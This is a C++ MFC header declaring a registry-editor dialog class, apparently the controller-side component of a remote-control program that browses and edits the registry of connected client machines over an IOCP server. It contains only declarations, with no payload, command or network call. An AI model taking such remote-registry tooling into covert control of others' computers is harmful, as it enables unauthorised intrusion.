#pragma once

#include "IOCPServer.h"
#include "afxcmn.h"

// CRegDlg �Ի���

class CRegDlg : public CDialog
{
	DECLARE_DYNAMIC(CRegDlg)

public:
	CRegDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // ��׼���캯��
	virtual ~CRegDlg();
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	bool isEnable;           //�ؼ��Ƿ����
	HTREEITEM	SelectNode;
	CImageList m_HeadIcon;
	HTREEITEM	m_hRoot;
	HTREEITEM	HKLM;
	HTREEITEM	HKCR;
	HTREEITEM	HKCU;
	HTREEITEM	HKUS;
	HTREEITEM	HKCC;
	CImageList	m_ImageList_tree;

	CString GetFullPath(HTREEITEM hCurrent);

	void CRegDlg::AddPath(char* lpBuffer);
	void CRegDlg::AddKey(char* lpBuffer);
	char CRegDlg::getFatherPath(CString& FullPath);
// �Ի�������
	enum { IDD = IDD_DIALOG_REGEDIT };

	void CRegDlg::OnReceiveComplete(void);
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	CTreeCtrl m_tree;
	CListCtrl m_list;
	afx_msg void OnTvnSelchangedTree(NMHDR *pNMHDR, LRESULT *pResult);
};
